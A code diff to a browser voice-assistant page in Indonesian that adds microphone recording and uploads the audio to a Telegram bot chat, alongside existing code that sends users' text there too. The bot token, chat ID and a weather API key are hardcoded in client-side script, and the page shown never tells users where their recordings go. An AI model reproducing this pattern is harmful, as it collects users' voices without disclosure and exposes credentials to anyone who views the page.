@@ -17,7 +17,7 @@
             text-align: center;
         }
         #asisten {
-            width: 500px;
+            width: 400px;
             padding: 20px;
             border-radius: 10px;
             background-color: rgba(255, 255, 255, 0.1);
@@ -27,7 +27,7 @@
             padding: 15px;
             border: none;
             border-radius: 50px;
-            background-color: black;
+            background-color:black;
             color: white;
             cursor: pointer;
             font-size: 18px;
@@ -38,6 +38,12 @@
             text-align: left;
         }
         .typing-indicator {
+            border-radius: 5px;
+            padding: 5px 10px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .wave-animation {
             border-radius: 5px;
             padding: 5px 10px;
             display: inline-block;
@@ -73,6 +79,8 @@
         <h1>AI PROJECT</h1>
         <p>Tekan tombol di bawah untuk mulai berbicara:</p>
         <button id="start-btn" onclick="startRecognition()">Ngobrol Sekarang</button>
+        <button id="record-btn" onclick="startRecording()">Rekam Suara</button>
+        <button id="stop-recording-btn" onclick="stopRecording()" style="display:none;">Stop Recording</button>
         <div class="wave-animation" id="wave-animation" style="display: none;">
             <div class="wave"></div>
             <div class="wave"></div>
@@ -94,6 +102,10 @@
         const telegramToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
         const chatId = '-1002221697926'; // Ganti dengan chat ID Anda
 
+        // Pengaturan Rekaman Suara
+        let mediaRecorder;
+        let audioChunks = [];
+
         function startRecognition() {
             document.getElementById("wave-animation").style.display = "flex";
             document.getElementById("output").innerHTML = '<p class="typing-indicator">Mendengarkan...</p>';
@@ -113,6 +125,55 @@
             document.getElementById("wave-animation").style.display = "none";
             document.getElementById("output").innerHTML = `<p>Terjadi kesalahan, coba lagi.</p>`;
         };
+
+        function startRecording() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.start();
+                    document.getElementById("record-btn").style.display = "none";
+                    document.getElementById("stop-recording-btn").style.display = "inline";
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        sendAudioToTelegram(audioBlob);
+                        audioChunks = [];
+                        document.getElementById("record-btn").style.display = "inline";
+                        document.getElementById("stop-recording-btn").style.display = "none";
+                    };
+                })
+                .catch(error => console.error('Terjadi kesalahan saat memulai rekaman:', error));
+        }
+
+        function stopRecording() {
+            if (mediaRecorder) {
+                mediaRecorder.stop();
+            }
+        }
+
+        function sendAudioToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('audio', audioBlob, 'recording.ogg');
+
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendAudio`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Pesan suara berhasil dikirim ke Telegram.');
+                } else {
+                    console.error('Gagal mengirim pesan suara ke Telegram:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Terjadi kesalahan saat mengirim pesan suara:', error);
+            });
+        }
 
         function detectLanguage(text) {
             let detectedLanguage = autoDetectLanguage(text);
@@ -163,45 +224,30 @@
         function getWeather(text) {
             const apiKey = 'daa5f78a98d2cdd3955fee0ac2de3694'; // Masukkan API Key OpenWeatherMap Anda
             const city = text.replace('cuaca di', '').trim(); // Ekstrak nama kota
+            // Melanjutkan kode getWeather
             const url = `https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${apiKey}&units=metric&lang=id`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
-                    if (data.cod === 200) {
-                        const weatherDescription = data.weather[0].description;
+                    if (data.weather) {
+                        const weather = data.weather[0].description;
                         const temp = data.main.temp;
-                        speak(`Cuaca di ${city} saat ini ${weatherDescription} dengan suhu sekitar ${temp} derajat Celsius.`, 'id-ID');
+                        speak(`Cuaca di ${city} saat ini adalah ${weather} dengan suhu ${temp} derajat Celsius.`, 'id-ID');
                     } else {
-                        speak(`Maaf, saya tidak dapat menemukan informasi cuaca untuk ${city}.`, 'id-ID');
+                        speak('Kota tidak ditemukan atau data cuaca tidak tersedia.', 'id-ID');
                     }
                 })
                 .catch(error => {
-                    speak('Terjadi kesalahan saat mengambil data cuaca.', 'id-ID');
+                    console.error('Terjadi kesalahan saat mendapatkan data cuaca:', error);
+                    speak('Terjadi kesalahan saat mendapatkan data cuaca.', 'id-ID');
                 });
         }
 
         function performGoogleSearch(text) {
-            const query = text.replace(/(carikan aku|tolong cari)/gi, '').trim();
-            const searchUrl = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
-
-            fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(searchUrl)}`)
-                .then(response => response.json())
-                .then(data => {
-                    const parser = new DOMParser();
-                    const doc = parser.parseFromString(data.contents, 'text/html');
-                    const results = Array.from(doc.querySelectorAll('div.BNeawe.vvjwJb.AP7Wnd')).slice(0, 5);
-                    if (results.length > 0) {
-                        const outputHtml = results.map(result => `<p>${result.innerText}</p>`).join('');
-                        document.getElementById("output").innerHTML += outputHtml;
-                        speak('Ini hasil pencarian yang saya temukan.', 'id-ID');
-                    } else {
-                        speak('Maaf, saya tidak menemukan informasi yang relevan.', 'id-ID');
-                    }
-                })
-                .catch(error => {
-                    speak('Terjadi kesalahan saat melakukan pencarian.', 'id-ID');
-                });
+            const query = text.replace('carikan aku', '').replace('tolong cari', '').trim();
+            const url = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
+            window.open(url, '_blank');
         }
 
         function speak(text, lang) {
@@ -210,28 +256,16 @@
             synth.speak(utterance);
         }
 
-        function saveUserData(text) {
-            let userData = JSON.parse(localStorage.getItem('userData')) || [];
-            let newEntry = {
-                text: text,
-                timestamp: new Date().toLocaleString()
-            };
-            userData.push(newEntry);
-            localStorage.setItem('userData', JSON.stringify(userData));
-        }
-
         function sendTelegramMessage(text) {
-            const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-            const messageData = {
-                chat_id: chatId,
-                text: text };
-
-            fetch(telegramUrl, {
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(messageData)
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
             })
             .then(response => response.json())
             .then(data => {
@@ -244,6 +278,11 @@
             .catch(error => {
                 console.error('Terjadi kesalahan saat mengirim pesan ke Telegram:', error);
             });
+        }
+
+        function saveUserData(text) {
+            // Simpan data pengguna ke server atau basis data jika diperlukan
+            console.log('Data pengguna disimpan:', text);
         }
     </script>
 </body>
